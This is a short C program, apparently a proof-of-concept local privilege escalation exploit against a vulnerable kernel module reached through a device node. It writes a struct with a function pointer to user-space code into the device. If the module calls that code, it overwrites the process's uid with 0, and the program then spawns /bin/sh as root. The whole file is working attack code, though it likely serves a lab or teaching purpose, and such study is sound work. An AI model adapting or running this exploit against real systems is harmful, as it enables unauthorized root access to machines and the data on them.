#include <err.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include <sys/stat.h>
#include <sys/types.h>

static int been_here;
static uid_t old_uid;

static void user_fun(const uid_t *uid)
{
	uid_t *uid_rw = (uid_t *)uid;

	been_here = 1;
	/* normally we would have to find the euid pointer, but the module pass
	 * it to us for free */
	old_uid = *uid;
	*uid_rw = 0; /* 0 is root :) */
}

struct his_struct {
	char dummy[10];
	void (*fun)(const uid_t *euid);
};

static void run_shell(void)
{
	static char * const argv[] = { "/bin/sh", NULL };
	static char * const envp[] = { NULL };

	execve("/bin/sh", argv, envp);

	err(100, "exec");
}

int main(int argc, char **argv)
{
	struct his_struct his = {
		.fun = user_fun,
	};
	void *ptr = "normal run";
	size_t size = 10;
	int fd;

	if (argc < 3)
		errx(2, "usage: %s 0|1 <dev_node>", argv[0]);

	printf("I'm uid=%d, been_here=%u\n", getuid(), been_here);

	fd = open(argv[2], O_RDWR);
	if (fd < 0)
		err(3, "cannot open '%s'", argv[1]);

	if (*argv[1] == '1') {
		ptr = &his;
		size = sizeof his;
	}

	if (write(fd, ptr, size) != size)
		err(4, "write");

	close(fd);

	printf("I'm uid=%d, old_uid=%d, been_here=%u\n", getuid(),
			been_here ? old_uid : -1, been_here);

	if (getuid() == 0)
		run_shell();

	puts("Couldn't hack it up");

	return 0;
}
